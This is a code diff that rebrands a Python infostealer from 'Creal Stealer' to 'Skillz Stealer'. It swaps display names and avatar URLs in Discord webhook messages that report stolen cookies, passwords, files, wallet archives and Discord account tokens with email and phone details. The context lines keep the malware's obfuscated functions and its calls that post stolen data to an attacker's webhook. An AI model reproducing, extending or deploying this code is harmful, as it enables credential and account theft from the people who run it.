@@ -356,7 +356,7 @@ def upl05dT4k31(t0k3n, path):
     us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
 
     if pfp == None: 
-        pfp = "https://i.imgur.com/S0Zqp4R.jpg"
+        pfp = "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -423,8 +423,8 @@ def upl05dT4k31(t0k3n, path):
                 }
             }
         ],
-        "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
-        "username": "Creal Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg",
+        "username": "Skillz Stealer",
         "attachments": []
         }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -452,17 +452,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Cookies Stealer",
+                    "title": "Skillz | Cookies Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
+                        "text": "Skillz Stealer",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg"
                     }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Skillz Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -478,17 +478,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Password Stealer",
+                    "title": "Skillz | Password Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
+                        "text": "Skillz | Stealer",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg"
                     }
                 }
             ],
-            "username": "Creal",
-            "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
+            "username": "Skillz",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -507,16 +507,16 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Creal | File Stealer"
+                    "name": "Skillz | File Stealer"
                 },
                 "footer": {
-                    "text": "Creal Stealer",
-                    "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
+                    "text": "Skillz Stealer",
+                    "icon_url": "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg"
                 }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
+            "username": "Skillz Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -706,17 +706,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Creal Zips",
+            "title": "Skillz Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
+                "text": "Skillz Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg"
             }
             }
         ],
-        "username": "Creal Stealer",
-        "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
+        "username": "Skillz Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1123401807369084963/1127991696517496893/Neon_gnager_real.jpg",
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
